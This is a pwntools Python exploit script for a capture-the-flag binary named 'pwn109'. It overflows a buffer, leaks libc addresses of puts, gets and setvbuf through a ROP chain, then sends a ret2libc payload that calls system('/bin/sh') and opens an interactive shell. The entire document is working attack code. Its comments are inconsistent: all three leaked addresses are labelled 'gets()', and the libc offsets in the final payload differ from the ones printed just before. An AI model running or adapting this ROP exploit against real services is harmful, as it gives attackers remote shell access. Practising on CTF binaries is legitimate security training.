#!/usr/bin/python3 

from pwn import *
import re, time


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())



# Set up pwntools for the correct architecture
exe = './pwn109'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

io = start()

#io.clean()


padding = 40

POP_RDI = 0x004012a3

payload = flat(
    b'A' * padding,
    POP_RDI,
    elf.got['puts'],
    elf.plt['puts'],
    POP_RDI,
    elf.got['gets'],
    elf.plt['puts'],
    POP_RDI,
    elf.got['setvbuf'],
    elf.plt['puts'],
    elf.symbols['main']

)

write('payload', payload)

#io.clean()
io.recvuntil(b'ahead')
io.recvline()
io.sendline(payload)


addr = io.recvline()
puts_address = u64(addr.strip().ljust(8, b'\0'))
log.info(f'puts() address: {hex(puts_address)}')

addr = io.recvline()
gets_address = u64(addr.strip().ljust(8, b'\0'))
log.info(f'gets() address: {hex(gets_address)}')

addr = io.recvline()
setvbuf_address = u64(addr.strip().ljust(8, b'\0'))
log.info(f'setvbuf() address: {hex(setvbuf_address)}')

# output:
# [*] gets() address: 0x7feeb6f7caa0
# [*] gets() address: 0x7feeb6f7c190
# [*] gets() address: 0x7feeb6f7d3d0

# use this https://libc.rip/

print('bin/sh = {}'.format(hex(puts_address+0x157828) ))
print('system = {}'.format(hex(puts_address-0x300E0) ))

# #io.interactive()
# #0x21bf7
payload = flat(
    b'A' * padding,
    POP_RDI,
    puts_address+0x13337A,
    # ret see comment below
    0x040101a,
    puts_address-0x31550
)

# Note: One caveat with the exploit is that we need to add an extra ROP gadget 
# with a ret to make sure the stack is 64bit aligned. 
# On most amd64 Linux distributions, glibc uses the SSE instruction set
# which expects the stack to be aligned on a 16-byte boundary or a general-protection exception (#GP) 
# will be generated. An example of such instruction is movaps, which is actually used somewhere in system() .

io.sendline(payload)
io.interactive()